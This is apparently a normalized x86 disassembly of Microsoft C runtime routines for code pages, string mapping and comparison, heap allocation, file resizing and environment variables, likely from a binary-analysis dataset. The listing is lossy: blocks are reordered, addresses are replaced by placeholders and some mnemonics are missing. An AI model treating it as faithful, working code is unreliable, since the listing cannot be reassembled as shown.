mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_40ad8c
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40adbf
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40ade8
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_40aa1e
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_40b531
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_40b531
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_40af89
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rw-data ]
call eax
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
mov [ rw-data ] eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
push ebx
call eax
mov ebx eax
sub_40b020
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_40b11e
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je r-xdata
mov esi [ rw-data ]
mov eax rw-data
dec eax
dec eax
je r-xdata
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_40b24b
mov esi [ eax + 0x8 ]
add eax 0x8
pop ecx
jmp r-xdata
sub eax 0x4
je r-xdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je r-xdata
push 0x3
call sub_40637a
pop edi
pop esi
pop ebp
retn
cmp esi 0x1
jne r-xdata
sub eax 0x3
je r-xdata
mov ebx [ rw-data ]
and [ rw-data ] 0x0
cmp edi ecx
jne r-xdata
cmp edi 0xb
je r-xdata
sub eax 0x4
je r-xdata
and [ eax ] 0x0
cmp edi ecx
jne r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x8c
mov [ ebp + 0x8 ] edx
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
push edi
call esi
cmp edi 0xb
pop ecx
je r-xdata
push [ rw-data ]
push 0x8
call esi
pop ecx
pop ecx
jmp r-xdata
cmp edi ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
dec eax
je r-xdata
cmp edi 0x8
mov [ rw-data ] ebx
jne r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
cmp eax ecx
jge r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
lea edx [ eax + eax * 2 ]
sub ecx eax
lea edx [ edx * 4 + rw-data ]
and [ edx ] 0x0
add edx 0xc
dec ecx
jne r-xdata
jmp r-xdata
sub_40b24b
mov edx [ esp + 0x4 ]
mov ecx [ rw-data ]
cmp [ rw-data ] edx
push esi
mov eax rw-data
je r-xdata
lea ecx [ ecx + ecx * 2 ]
pop esi
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
jae r-xdata
lea esi [ ecx + ecx * 2 ]
lea esi [ esi * 4 + rw-data ]
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
jne r-xdata
retn
add eax 0xc
cmp eax esi
jae r-xdata
sub_40b290
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_406e78
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push ebx
call sub_407263
mov edi eax
pop ecx
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_405a60
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_40b30d
push esi
push edi
push 0x3
xor edi edi
pop esi
cmp [ rw-data ] esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_405ab8
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_405f9f
mov eax [ rw-data ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_40b36e
push ebp
mov ebp esp
mov eax 0x1000
call sub_405f70
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ebx [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov eax ebx
mov ecx ebx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
test [ eax + ecx * 8 + 0x4 ] 0x1
je r-xdata
push 0x1
push esi
push ebx
call sub_408b3a
add esp 0xc
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
or eax 0xffffffff
push 0x2
push esi
push ebx
call sub_408b3a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push edi
mov edi [ ebp + 0xc ]
sub edi eax
test edi edi
jle r-xdata
jge r-xdata
push 0x1000
lea eax [ ebp - 0x1000 ]
push esi
push eax
call sub_405a60
push 0x8000
push ebx
call sub_40b780
add esp 0x14
mov [ ebp + 0xc ] eax
push 0x0
push [ ebp + 0x8 ]
push ebx
call sub_408b3a
add esp 0xc
mov eax esi
pop edi
jmp r-xdata
push 0x0
push [ ebp + 0xc ]
push ebx
call sub_408b3a
push ebx
call sub_40a172
add esp 0x10
push eax
call [ SetEndOfFile@IAT ]
mov esi eax
neg esi
sbb esi esi
neg esi
dec esi
cmp esi 0xffffffff
jne r-xdata
push eax
lea eax [ ebp - 0x1000 ]
push eax
push ebx
call sub_408d2c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop esi
pop ebx
leave
retn
mov [ rw-data ] 0xd
call [ GetLastError@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x5
jne r-xdata
sub edi eax
test edi edi
jle r-xdata
or esi 0xffffffff
mov [ rw-data ] 0xd
push [ ebp + 0xc ]
push ebx
call sub_40b780
pop ecx
pop ecx
jmp r-xdata
jmp r-xdata
mov eax 0x1000
cmp edi eax
jge r-xdata
sub_40b4b4
cmp [ rw-data ] 0x0
push ebx
push esi
mov esi [ rw-data ]
push edi
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
push ebx
call sub_405450
pop ecx
mov edi eax
call sub_40b835
test eax eax
jne r-xdata
push eax
call sub_405450
cmp eax edi
pop ecx
jbe r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
add esi 0x4
jmp r-xdata
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push edi
push ebx
push eax
call sub_40b7f6
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40b531
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ ebp + 0x14 ] edi
jle r-xdata
push edi
push edi
push 0x1
pop ebx
push ebx
push r--data
mov esi 0x100
push esi
push edi
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_40b755
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
push edi
push edi
push ebx
push r--data
push esi
push edi
call [ LCMapStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] ebx
jmp r-xdata
cmp eax 0x1
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
jmp r-xdata
xor eax eax
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] edi
jne r-xdata
lea esp [ ebp - 0x38 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x24 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov ebx eax
mov [ ebp - 0x1c ] ebx
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
mov [ ebp - 0x4 ] edi
lea eax [ ebx + ebx ]
add eax 0x3
and al 0xfc
call sub_405f70
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x24 ] edi
je r-xdata
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
mov esi eax
mov [ ebp - 0x28 ] esi
cmp esi edi
je r-xdata
test [ ebp + 0xd ] 0x4
je r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_405f70
mov [ ebp - 0x18 ] esp
mov ebx esp
mov [ ebp - 0x20 ] ebx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov eax esi
jmp r-xdata
cmp esi [ ebp + 0x1c ]
jg r-xdata
push esi
push ebx
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] edi
push edi
push edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push edi
jmp r-xdata
push esi
push ebx
push 0x220
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp esi edi
je r-xdata
sub_40b755
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
test edx edx
push esi
lea ecx [ edx - 0x1 ]
je r-xdata
cmp [ eax ] 0x0
pop esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
mov eax edx
retn
sub eax [ esp + 0x4 ]
retn
inc eax
mov esi ecx
dec ecx
test esi esi
jne r-xdata
sub_40b780
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
lea edx [ ecx + eax * 8 + 0x4 ]
mov cl [ ecx + eax * 8 + 0x4 ]
test cl 0x1
je r-xdata
mov al cl
mov esi 0x8000
and eax 0x80
cmp [ esp + 0xc ] esi
jne r-xdata
cmp [ esp + 0xc ] 0x4000
jne r-xdata
and cl 0x7f
jmp r-xdata
mov [ rw-data ] 0x16
jmp r-xdata
or cl 0x80
neg eax
sbb eax eax
mov [ edx ] cl
and ax 0xc000
add eax esi
pop esi
retn
or eax 0xffffffff
pop esi
retn
sub_40b7f6
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
push 0x1
push [ rw-data ]
call sub_40b8a3
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
add eax 0xfffffffe
pop ebp
retn
mov eax 0x7fffffff
pop ebp
retn
sub_40b835
push ecx
push ebx
push ebp
push esi
mov esi [ rw-data ]
push edi
xor edi edi
mov eax [ esi ]
cmp eax edi
je r-xdata
xor eax eax
mov ebx [ WideCharToMultiByte@IAT ]
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_4054cb
cmp eax edi
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
push edi
push edi
push ebp
push eax
push 0xffffffff
push [ esi ]
push edi
push 0x1
call ebx
test eax eax
je r-xdata
push edi
push [ esp + 0x14 ]
call sub_40bb20
mov eax [ esi + 0x4 ]
add esi 0x4
pop ecx
cmp eax edi
pop ecx
jne r-xdata
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov ebp eax
cmp ebp edi
je r-xdata
sub_40b8a3
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x30
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
cmp [ rw-data ] ebx
push 0x1
pop edi
jne r-xdata
mov esi [ ebp + 0x14 ]
cmp esi ebx
jle r-xdata
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringW@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
push esi
push [ ebp + 0x10 ]
call sub_40b755
pop ecx
pop ecx
mov esi eax
mov [ ebp + 0x14 ] esi
push edi
mov eax r--data
push eax
push edi
push eax
push ebx
push ebx
call [ CompareStringA@IAT ]
test eax eax
je r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x2
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
call sub_40b755
pop ecx
pop ecx
mov [ ebp + 0x1c ] eax
xor eax eax
mov [ rw-data ] 0x2
cmp eax edi
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringA@IAT ]
jmp r-xdata
cmp [ ebp + 0x20 ] ebx
jne r-xdata
lea esp [ ebp - 0x4c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x20 ] eax
cmp esi [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp [ ebp + 0x1c ] edi
jle r-xdata
push 0x2
push ebx
push ebx
push esi
push [ ebp + 0x10 ]
push 0x9
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
cmp esi edi
jg r-xdata
mov eax edi
jmp r-xdata
mov [ ebp - 0x4 ] ebx
add eax eax
add eax 0x3
and al 0xfc
call sub_405f70
mov [ ebp - 0x18 ] esp
mov eax esp
mov [ ebp - 0x24 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x3
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push [ ebp + 0x20 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
pop eax
jmp r-xdata
cmp esi ebx
jle r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x20 ]
mov esi [ MultiByteToWideChar@IAT ]
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] ebx
jle r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
push ebx
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x9
push [ ebp + 0x20 ]
call esi
mov esi eax
mov [ ebp - 0x20 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp - 0x3c ] 0x2
jb r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov [ ebp - 0x4 ] edi
lea eax [ esi + esi ]
add eax 0x3
and al 0xfc
call sub_405f70
mov [ ebp - 0x18 ] esp
mov edi esp
mov [ ebp - 0x28 ] edi
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x36 ]
cmp [ ebp - 0x36 ] bl
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
cmp edi ebx
je r-xdata
mov dl [ eax + 0x1 ]
cmp dl bl
je r-xdata
mov ecx [ ebp + 0x10 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
push esi
push edi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push 0x1
push [ ebp + 0x20 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov cl [ ecx ]
cmp cl [ eax ]
jb r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
push esi
push edi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CompareStringW@IAT ]
jmp r-xdata
inc eax
inc eax
cmp [ eax ] bl
jne r-xdata
cmp cl dl
jbe r-xdata
jmp r-xdata
sub_40bb20
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
or eax 0xffffffff
push 0x3d
push [ ebp + 0x8 ]
call sub_40be86
mov esi eax
pop ecx
cmp esi edi
pop ecx
mov [ ebp - 0x8 ] esi
je r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp [ esi + 0x1 ] bl
sete bl
cmp eax [ rw-data ]
jne r-xdata
cmp eax edi
jne r-xdata
push eax
call sub_40bcff
pop ecx
mov [ rw-data ] eax
sub esi [ ebp + 0x8 ]
mov edi [ rw-data ]
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x8 ]
call sub_40bca7
mov esi eax
pop ecx
test esi esi
pop ecx
jl r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
test ebx ebx
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp ebx edi
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
xor eax eax
jmp r-xdata
test esi esi
jge r-xdata
test ebx ebx
je r-xdata
push 0x4
call sub_4054cb
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_40b835
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ esi * 4 + 0x8 ]
push eax
push edi
call sub_40bd66
pop ecx
test eax eax
pop ecx
je r-xdata
neg esi
mov eax [ ebp + 0x8 ]
mov [ edi + esi * 4 ] eax
jmp r-xdata
push [ edi + esi * 4 ]
lea edi [ edi + esi * 4 ]
call sub_405f9f
pop ecx
mov [ eax ] edi
cmp [ rw-data ] edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + esi * 4 ] ecx
and [ eax + esi * 4 + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax esi
shl eax 0x2
push eax
push [ ebp - 0x4 ]
call sub_40bd66
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ edi + 0x4 ]
inc esi
mov [ edi ] eax
add edi 0x4
jmp r-xdata
push 0x4
call sub_4054cb
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_405450
inc eax
inc eax
push eax
call sub_4054cb
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov [ eax ] edi
push [ ebp + 0x8 ]
push esi
call sub_405540
mov eax esi
pop ecx
sub eax [ ebp + 0x8 ]
pop ecx
add eax [ ebp - 0x8 ]
and [ eax ] 0x0
inc eax
neg ebx
sbb ebx ebx
not ebx
and ebx eax
push ebx
push esi
call [ SetEnvironmentVariableA@IAT ]
push esi
call sub_405f9f
pop ecx
mov [ rw-data ] eax
sub_40bca7
push esi
mov esi [ rw-data ]
push edi
mov eax [ esi ]
test eax eax
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4 ]
add esi 0x4
test eax eax
jne r-xdata
mov eax [ esi ]
mov al [ eax + edi ]
cmp al 0x3d
je r-xdata
push edi
push eax
push [ esp + 0x14 ]
call sub_40b7f6
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop edi
pop esi
retn
sub_40bcff
push edi
mov edi [ esp + 0x8 ]
xor ecx ecx
test edi edi
jne r-xdata
cmp [ edi ] 0x0
lea eax [ edi + 0x4 ]
je r-xdata
xor eax eax
pop edi
retn
push ebx
push ebp
lea eax [ ecx * 4 + 0x4 ]
push esi
push eax
call sub_4054cb
mov esi eax
pop ecx
test esi esi
mov ebp esi
jne r-xdata
mov edx [ eax ]
inc ecx
add eax 0x4
test edx edx
jne r-xdata
mov eax [ edi ]
mov ebx edi
push 0x9
call sub_406534
pop ecx
and [ esi ] 0x0
mov eax ebp
pop esi
pop ebp
pop ebx
pop edi
retn
push eax
add ebx 0x4
call sub_40bef9
mov [ esi ] eax
mov eax [ ebx ]
pop ecx
add esi 0x4
jmp r-xdata
test eax eax
je r-xdata
sub_40bd66
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
test ebx ebx
push edi
jne r-xdata
mov esi [ esp + 0x18 ]
test esi esi
jne r-xdata
push [ esp + 0x18 ]
call sub_4054cb
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_405f9f
pop ecx
pop edi
pop esi
pop ebp
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
push ebx
call sub_406f0d
mov ebp eax
pop ecx
test ebp ebp
je r-xdata
mov eax edi
push esi
call sub_406e78
test eax eax
pop ecx
jne r-xdata
test esi esi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push ebp
call sub_407718
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_407263
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_405720
push ebx
push ebp
call sub_406f38
add esp 0x14
jmp r-xdata
mov eax esi
push eax
push ebx
push edi
call sub_405720
push ebx
push ebp
call sub_406f38
add esp 0x14
mov eax esi
test edi edi
jne r-xdata
sub_40be86
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405d80
pop ecx
pop ecx
pop ebp
retn
movzx edx ax
mov eax [ ebp + 0xc ]
sub eax edx
neg eax
sbb eax eax
not eax
and eax ecx
pop ebp
retn
movzx edx al
test [ edx + rw-data ] 0x4
je r-xdata
movzx edx ax
cmp [ ebp + 0xc ] edx
je r-xdata
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
inc ecx
jmp r-xdata
xor eax eax
pop ebp
retn
movzx eax ax
movzx edx dl
shl eax 0x8
or eax edx
cmp [ ebp + 0xc ] eax
je r-xdata
movzx ax [ ecx ]
test ax ax
je r-xdata
lea eax [ ecx - 0x1 ]
pop ebp
retn
jmp r-xdata
sub_40bef9
